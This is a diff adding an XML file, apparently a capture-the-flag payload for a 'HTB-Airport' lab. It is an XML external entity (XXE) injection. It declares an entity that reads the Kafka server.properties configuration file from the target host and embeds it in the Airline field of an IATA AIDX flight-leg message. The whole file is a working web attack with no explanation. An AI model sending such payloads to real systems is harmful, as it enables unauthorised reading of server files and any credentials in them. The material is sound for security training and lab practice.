@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///opt/kafka_2.13-4.3.1/config/server.properties"> ]>
+<IATA_AIDX_FlightLegNotifRQ xmlns="http://iata.org">
+    <Originator Name="HTB-Airport" />
+    <FlightLeg>
+        <LegIdentifier>
+            <Airline CodeContext="IATA">&xxe;</Airline>
+            <FlightNumber>1337</FlightNumber>
+            <Origin>FCO</Origin>
+            <Destination>BLQ</Destination>
+        </LegIdentifier>
+    </FlightLeg>
+</IATA_AIDX_FlightLegNotifRQ>
